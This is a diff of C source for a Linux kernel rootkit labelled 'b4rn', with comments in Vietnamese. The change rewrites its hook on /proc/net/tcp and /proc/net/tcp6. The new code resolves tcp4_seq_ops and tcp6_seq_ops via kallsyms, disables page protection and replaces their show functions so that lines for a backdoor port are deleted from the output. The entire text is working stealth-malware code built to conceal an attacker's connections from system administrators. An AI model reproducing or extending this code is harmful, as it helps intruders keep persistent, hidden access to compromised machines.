@@ -378,94 +378,91 @@ hook_pid_maps_seq_show(const char *path)
 
 
 /* =================================================================
- * PHẦN 6.5: HOOK /proc/net/tcp — ẨN KẾT NỐI MẠNG
+ * PHẦN 6.5: HOOK /proc/net/tcp — ẨN KẾT NỐI MẠNG (SỬ DỤNG KALLSYMS)
  * ================================================================= */
 
-struct my_proc_dir_entry {
-	unsigned int low_ino;
-	umode_t mode;
-	nlink_t nlink;
-	kuid_t uid;
-	kgid_t gid;
-	loff_t size;
-	const struct inode_operations *proc_iops;
-	const struct file_operations *proc_fops;
-	struct proc_dir_entry *parent;
-	struct rb_root subdir;
-	struct rb_node subdir_node;
-	void *data;
-	atomic_t count;
-	atomic_t in_use;
-	struct completion *pde_unload_completion;
-	struct list_head pde_openers;
-	spinlock_t pde_unload_lock;
-	u8 namelen;
-	char name[];
-};
+static struct seq_operations *tcp4_seq_ops_ptr = NULL;
+static struct seq_operations *tcp6_seq_ops_ptr = NULL;
 
-struct my_tcp_seq_afinfo {
-	char				*name;
-	sa_family_t			family;
-	const struct file_operations	*seq_fops;
-	struct seq_operations		seq_ops;
-};
+static int (*old_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
+static int (*old_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
 
-static int (*old_tcp_seq_show)(struct seq_file *seq, void *v) = NULL;
-static unsigned long *tcp_seq_show_addr_ptr = NULL;
-
-static int new_tcp_seq_show(struct seq_file *seq, void *v)
+static int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-    struct sock *sk = v;
-    if (v != SEQ_START_TOKEN) {
-        if (sk->sk_family == AF_INET) {
-            struct inet_sock *inet = inet_sk(sk);
-            if (ntohs(inet->inet_sport) == BACKDOOR_PORT ||
-                ntohs(inet->inet_dport) == BACKDOOR_PORT) {
-                return 0; /* Skip this connection */
-            }
-        }
+    int ret, prev_len, this_len;
+    char port_hex[16];
+
+    /* Port 9474 in hex is 2502. The format in /proc/net/tcp is IP:PORT */
+    snprintf(port_hex, sizeof(port_hex), ":%04X", BACKDOOR_PORT);
+
+    prev_len = seq->count;
+    ret      = old_tcp4_seq_show(seq, v);
+    this_len = seq->count - prev_len;
+
+    if (strnstr(seq->buf + prev_len, port_hex, this_len)) {
+        seq->count -= this_len; /* Xóa dòng này khỏi output */
     }
-    return old_tcp_seq_show(seq, v);
+    return ret;
+}
+
+static int new_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    int ret, prev_len, this_len;
+    char port_hex[16];
+
+    snprintf(port_hex, sizeof(port_hex), ":%04X", BACKDOOR_PORT);
+
+    prev_len = seq->count;
+    ret      = old_tcp6_seq_show(seq, v);
+    this_len = seq->count - prev_len;
+
+    if (strnstr(seq->buf + prev_len, port_hex, this_len)) {
+        seq->count -= this_len; /* Xóa dòng này khỏi output */
+    }
+    return ret;
 }
 
 static int init_proc_net_tcp_hook(void)
 {
-    struct my_proc_dir_entry *net_pde = (struct my_proc_dir_entry *)init_net.proc_net;
-    struct rb_node *node;
-    struct my_proc_dir_entry *pde;
-    struct my_tcp_seq_afinfo *afinfo;
+    tcp4_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops");
+    if (tcp4_seq_ops_ptr) {
+        old_tcp4_seq_show = tcp4_seq_ops_ptr->show;
+        unprotect_page((unsigned long)tcp4_seq_ops_ptr);
+        tcp4_seq_ops_ptr->show = new_tcp4_seq_show;
+        protect_page((unsigned long)tcp4_seq_ops_ptr);
+        printk(KERN_INFO "[b4rn] Hooked tcp4_seq_ops (/proc/net/tcp)\n");
+    }
 
-    if (!net_pde) return -1;
+    tcp6_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops");
+    if (tcp6_seq_ops_ptr) {
+        old_tcp6_seq_show = tcp6_seq_ops_ptr->show;
+        unprotect_page((unsigned long)tcp6_seq_ops_ptr);
+        tcp6_seq_ops_ptr->show = new_tcp6_seq_show;
+        protect_page((unsigned long)tcp6_seq_ops_ptr);
+        printk(KERN_INFO "[b4rn] Hooked tcp6_seq_ops (/proc/net/tcp6)\n");
+    }
 
-    for (node = rb_first(&net_pde->subdir); node; node = rb_next(node)) {
-        pde = rb_entry(node, struct my_proc_dir_entry, subdir_node);
-        if (strcmp(pde->name, "tcp") == 0) {
-            afinfo = (struct my_tcp_seq_afinfo *)pde->data;
-            if (afinfo) {
-                old_tcp_seq_show = afinfo->seq_ops.show;
-                tcp_seq_show_addr_ptr = (unsigned long *)&afinfo->seq_ops.show;
-                
-                unprotect_page((unsigned long)tcp_seq_show_addr_ptr);
-                *tcp_seq_show_addr_ptr = (unsigned long)new_tcp_seq_show;
-                protect_page((unsigned long)tcp_seq_show_addr_ptr);
-                
-                printk(KERN_INFO "[b4rn] Hooked /proc/net/tcp\n");
-                return 0;
-            }
-        }
+    if (!tcp4_seq_ops_ptr && !tcp6_seq_ops_ptr) {
+        printk(KERN_ERR "[b4rn] Could not find tcp4_seq_ops or tcp6_seq_ops\n");
+        return -1;
     }
     
-    printk(KERN_ERR "[b4rn] Could not find /proc/net/tcp entry\n");
-    return -1;
+    return 0;
 }
 
 static void deinit_proc_net_tcp_hook(void)
 {
-    if (tcp_seq_show_addr_ptr && old_tcp_seq_show) {
-        unprotect_page((unsigned long)tcp_seq_show_addr_ptr);
-        *tcp_seq_show_addr_ptr = (unsigned long)old_tcp_seq_show;
-        protect_page((unsigned long)tcp_seq_show_addr_ptr);
-        printk(KERN_INFO "[b4rn] Unhooked /proc/net/tcp\n");
+    if (tcp4_seq_ops_ptr && old_tcp4_seq_show) {
+        unprotect_page((unsigned long)tcp4_seq_ops_ptr);
+        tcp4_seq_ops_ptr->show = old_tcp4_seq_show;
+        protect_page((unsigned long)tcp4_seq_ops_ptr);
+        printk(KERN_INFO "[b4rn] Unhooked tcp4_seq_ops\n");
+    }
+    if (tcp6_seq_ops_ptr && old_tcp6_seq_show) {
+        unprotect_page((unsigned long)tcp6_seq_ops_ptr);
+        tcp6_seq_ops_ptr->show = old_tcp6_seq_show;
+        protect_page((unsigned long)tcp6_seq_ops_ptr);
+        printk(KERN_INFO "[b4rn] Unhooked tcp6_seq_ops\n");
     }
 }
 
